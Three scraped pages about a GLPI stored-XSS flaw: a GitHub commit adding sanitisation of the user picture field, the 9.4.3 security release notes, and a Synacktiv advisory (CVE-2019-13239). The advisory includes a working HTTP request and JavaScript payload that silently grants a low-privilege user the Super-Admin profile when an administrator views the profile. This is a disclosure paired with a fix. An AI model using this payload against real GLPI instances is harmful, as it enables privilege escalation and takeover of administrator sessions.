=== Content from github.com_3fe97d6a_20250121_005059.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fglpi-project%2Fglpi%2Fcommit%2Fc2aa7a7cd6af28be3809acc7e7842d2d2008c0fb)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fglpi-project%2Fglpi%2Fcommit%2Fc2aa7a7cd6af28be3809acc7e7842d2d2008c0fb)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=glpi-project%2Fglpi)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[glpi-project](/glpi-project)
/
**[glpi](/glpi-project/glpi)**
Public

* [Notifications](/login?return_to=%2Fglpi-project%2Fglpi) You must be signed in to change notification settings
* [Fork
  1.3k](/login?return_to=%2Fglpi-project%2Fglpi)
* [Star
   4.5k](/login?return_to=%2Fglpi-project%2Fglpi)

* [Code](/glpi-project/glpi)
* [Issues
  137](/glpi-project/glpi/issues)
* [Pull requests
  58](/glpi-project/glpi/pulls)
* [Actions](/glpi-project/glpi/actions)
* [Projects
  0](/glpi-project/glpi/projects)
* [Security](/glpi-project/glpi/security)
* [Insights](/glpi-project/glpi/pulse)

Additional navigation options

* [Code](/glpi-project/glpi)
* [Issues](/glpi-project/glpi/issues)
* [Pull requests](/glpi-project/glpi/pulls)
* [Actions](/glpi-project/glpi/actions)
* [Projects](/glpi-project/glpi/projects)
* [Security](/glpi-project/glpi/security)
* [Insights](/glpi-project/glpi/pulse)

## Commit

[Permalink](/glpi-project/glpi/commit/c2aa7a7cd6af28be3809acc7e7842d2d2008c0fb)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

avoid xss attack on user picture

[Browse files](/glpi-project/glpi/tree/c2aa7a7cd6af28be3809acc7e7842d2d2008c0fb)
Browse the repository at this point in the history

* Loading branch information

[![@orthagh](https://avatars.githubusercontent.com/u/418844?s=40&v=4)](/orthagh) [![@trasher](https://avatars.githubusercontent.com/u/224733?s=40&v=4)](/trasher)

[orthagh](/glpi-project/glpi/commits?author=orthagh "View all commits by orthagh")
authored and
[trasher](/glpi-project/glpi/commits?author=trasher "View all commits by trasher")
committed
Jun 20, 2019

1 parent
[6189eee](/glpi-project/glpi/commit/6189eee1ec8b978f1d14686051448d6b141e4ed7)

commit c2aa7a7

Showing
**1 changed file**
with
**17 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

17 changes: 17 additions & 0 deletions

17
[inc/user.class.php](#diff-0c4a5cabc12e4bfae99b6a16bfda7487720cc95c8736506b6d7ed6332ae9d508 "inc/user.class.php")

Show comments

[View file](/glpi-project/glpi/blob/c2aa7a7cd6af28be3809acc7e7842d2d2008c0fb/inc/user.class.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -550,6 +550,11 @@ function prepareInputForAdd($input) { |
|  |  | return false; |
|  |  | } |
|  |  |  |
|  |  | // avoid xss (picture field is autogenerated) |
|  |  | if (isset($input['picture'])) { |
|  |  | $input['picture'] = 'NULL'; |
|  |  | } |
|  |  |  |
|  |  | if (!isset($input["authtype"])) { |
|  |  | $input["authtype"] = Auth::DB\_GLPI; |
|  |  | } |
| Expand Down  Expand Up | | @@ -681,6 +686,11 @@ function post\_addItem() { |
|  |  | function prepareInputForUpdate($input) { |
|  |  | global $CFG\_GLPI; |
|  |  |  |
|  |  | // avoid xss (picture field is autogenerated) |
|  |  | if (isset($input['picture'])) { |
|  |  | $input['picture'] = 'NULL'; |
|  |  | } |
|  |  |  |
|  |  | //picture manually uploaded by user |
|  |  | if (isset($input["\_blank\_picture"]) && $input["\_blank\_picture"]) { |
|  |  | self::dropPictureFiles($this->fields['picture']); |
| Expand Down  Expand Up | | @@ -2004,6 +2014,7 @@ function showForm($ID, array $options = []) { |
|  |  | } |
|  |  |  |
|  |  | if (!empty($this->fields["name"])) { |
|  |  |  |
|  |  | echo "<td rowspan='4'>" . \_\_('Picture') . "</td>"; |
|  |  | echo "<td rowspan='4'>"; |
|  |  | echo "<div class='user\_picture\_border\_small' id='picture$rand'>"; |
| Expand Down  Expand Up | | @@ -4853,6 +4864,9 @@ static function checkDefaultPasswords() { |
|  |  | static function getURLForPicture($picture) { |
|  |  | global $CFG\_GLPI; |
|  |  |  |
|  |  | // prevent xss |
|  |  | $picture = Html::cleanInputText($picture); |
|  |  |  |
|  |  | if (!empty($picture)) { |
|  |  | return $CFG\_GLPI["root\_doc"]."/front/document.send.php?file=\_pictures/$picture"; |
|  |  | } |
| Expand All | | @@ -4872,6 +4886,9 @@ static function getURLForPicture($picture) { |
|  |  | static function getThumbnailURLForPicture($picture) { |
|  |  | global $CFG\_GLPI; |
|  |  |  |
|  |  | // prevent xss |
|  |  | $picture = Html::cleanInputText($picture); |
|  |  |  |
|  |  | if (!empty($picture)) { |
|  |  | $tmp = explode(".", $picture); |
|  |  | if (count($tmp) ==2) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `c2aa7a7`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fglpi-project%2Fglpi%2Fcommit%2Fc2aa7a7cd6af28be3809acc7e7842d2d2008c0fb) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_cddfaf51_20250121_005100.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fglpi-project%2Fglpi%2Freleases%2Ftag%2F9.4.3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fglpi-project%2Fglpi%2Freleases%2Ftag%2F9.4.3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=glpi-project%2Fglpi)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[glpi-project](/glpi-project)
/
**[glpi](/glpi-project/glpi)**
Public

* [Notifications](/login?return_to=%2Fglpi-project%2Fglpi) You must be signed in to change notification settings
* [Fork
  1.3k](/login?return_to=%2Fglpi-project%2Fglpi)
* [Star
   4.5k](/login?return_to=%2Fglpi-project%2Fglpi)

* [Code](/glpi-project/glpi/tree/9.4.3)
* [Issues
  137](/glpi-project/glpi/issues)
* [Pull requests
  58](/glpi-project/glpi/pulls)
* [Actions](/glpi-project/glpi/actions)
* [Projects
  0](/glpi-project/glpi/projects)
* [Security](/glpi-project/glpi/security)
* [Insights](/glpi-project/glpi/pulse)

Additional navigation options

* [Code](/glpi-project/glpi/tree/9.4.3)
* [Issues](/glpi-project/glpi/issues)
* [Pull requests](/glpi-project/glpi/pulls)
* [Actions](/glpi-project/glpi/actions)
* [Projects](/glpi-project/glpi/projects)
* [Security](/glpi-project/glpi/security)
* [Insights](/glpi-project/glpi/pulse)

1. [Releases](/glpi-project/glpi/releases)
2. [9.4.3](/glpi-project/glpi/releases/tag/9.4.3)

# 9.4.3

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/glpi-project/glpi/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...9.4.3)

 Loading

[View all tags](/glpi-project/glpi/tags)

![@trasher](https://avatars.githubusercontent.com/u/224733?s=40&v=4)
[trasher](/trasher)
released this
20 Jun 13:17

·
[287 commits](/glpi-project/glpi/compare/9.4.3...9.4/bugfixes)
to 9.4/bugfixes
since this release

[9.4.3](/glpi-project/glpi/tree/9.4.3)

[`081338b`](/glpi-project/glpi/commit/081338b2fa3a98eacb6f7ca380714f34ec0266ff)

## This is a security release, upgrading is highly recommended

[![Download it](https://camo.githubusercontent.com/aaf836007e73e0bef6b364a8c4ce8d252d32a31397fac3bea283907b930ef32f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f392e342e332d444f574e4c4f41445f474c50492d677265656e2e7376673f6c6f676f3d706870266c6f676f436f6c6f723d7768697465267374796c653d666f722d7468652d6261646765)](https://github.com/glpi-project/glpi/releases/download/9.4.3/glpi-9.4.3.tgz)

Non exhaustive list of changes:

* [security] Prevent execution of XSS on rich text,
* [security] Prevent xss attack on user picture,
* Fix performance issues when using entities,
* New “Prevent take into account” action on tickets business rules,
* New “Status” criterion on tickets business rules,
* Change and problem tasks can now be marked as private,
* and more!

See [changelog](https://github.com/glpi-project/glpi/milestone/36?closed=1) for details.

 Assets
3

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.synacktiv.com_ec703e0c_20250121_005100.html ===
Stored XSS in GLPI < 9.4.3

Security advisory
2019-07-04

Julien Legras

www.synacktiv.com

5 Boulevard Montmartre 75002 Paris

Vulnerability description

Presentation of GLPI
“GLPI is an incredible ITSM software tool that helps you plan and manage IT changes in an easy way, solve problems
efficiently when they emerge and allow you to gain legit control over your company’s IT budget, and expenses.”1

The issue
Synacktiv discovered that GLPI does not sanitize the profile picture name which can be used to inject malicious HTML and
JavaScript code inside the page. If an administrator access the profile, it can be used to interact with the GLPI instance with
the administrator profile and perform sensitive actions such as add the low privileges account to the Super-Admin group.

Affected versions
All versions 9.x < 9.4.3, are known to be affected.

Timeline

Date

2019-02-25

2019-06-20

2019-06-20

2019-07-04

Advisory sent to GLPI Project (glpi-security@ow2.org)

Action

GLPI team merged a patch for this issue.

GLPI fixed the XSS in release 9.4.3.

CVE-2019-13239 reserved.

1

https://glpi-project.org/

 2/4

Technical description and proof-of-concept

The user profile form allows uploading images as profile picture. This is done in 2 steps:

1. AJAX upload of the file.

2. Update the profile with the filename retrieved from the 1st AJAX request.

This profile picture is the filename of the uploaded image and this filename is stored in the database. The POST request
looks like:

POST /front/preference.php HTTP/1.1
Host: 172.18.0.3
[…]

------WebKitFormBoundarynhQG0l132nzGvcpA
Content-Disposition: form-data; name="name"

testuser
------WebKitFormBoundarynhQG0l132nzGvcpA
Content-Disposition: form-data; name="id"

5
------WebKitFormBoundarynhQG0l132nzGvcpA
Content-Disposition: form-data; name="realname"

------WebKitFormBoundarynhQG0l132nzGvcpA
Content-Disposition: form-data; name="_picture[0]"

5c6fc312b8ab50.57540855chat5.jpg
------WebKitFormBoundarynhQG0l132nzGvcpA
Content-Disposition: form-data; name="_prefix_picture[0]"

5c6fc312b8ab50.57540855
------WebKitFormBoundarynhQG0l132nzGvcpA
Content-Disposition: form-data; name="_tag_picture[0]"

435b1b81-d9d62df8-5c6fc312c12e01.39237464
------WebKitFormBoundarynhQG0l132nzGvcpA
Content-Disposition: form-data; name="picture[]"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundarynhQG0l132nzGvcpA
Content-Disposition: form-data; name="_blank_picture"
[…]

However, the code responsible for the preferences updates the user model with the request inputs:

if (isset($_POST["update"])
    && ($_POST["id"] === Session::getLoginUserID())) {
   $user->update($_POST);
[...]

As   the   user   model   has   a  picture  field,   it   is   possible   to   update   the   profile   with   malicious   HTML  attributes   and   execute
JavaScript inside the web browser. For instance, the following preferences update can be used to perform a local privilege

 3/4

escalation if an administrator views the profile:

POST /front/preference.php HTTP/1.1
Host: 172.18.0.3
[…]

------WebKitFormBoundarynhQG0l132nzGvcpA
Content-Disposition: form-data; name="name"

testuser
------WebKitFormBoundarynhQG0l132nzGvcpA
Content-Disposition: form-data; name="id"

5
[…]
------WebKitFormBoundarynhQG0l132nzGvcpA
Content-Disposition: form-data; name="picture[]"; filename=""
Content-Type: application/octet-stream

'
onerror="$.ajax({url:'/front/profile_user.form.php',method:'POST',data:'users_id=5&entities
_id=0&profiles_id=4&is_recursive=0&add=Add&_glpi_csrf_token='+$
('input[name=_glpi_csrf_token]').val()});" a='

This payload will add the Super-Admin profile (profiles_id=4) to the user (users_id=5).

The code is inserted without any sanitization by the function showMyForm in inc/user.class.php:

[...]
$full_picture  = "<div class='user_picture_border'>";
$full_picture .= "<img class='user_picture' alt=\"".__s('Picture')."\" src='".
                  User::getURLForPicture($this->fields['picture'])."'>";
$full_picture .= "</div>";
[...]

The getURLForPicture function does not sanitize the string, allowing inserting HTML.

 4/4


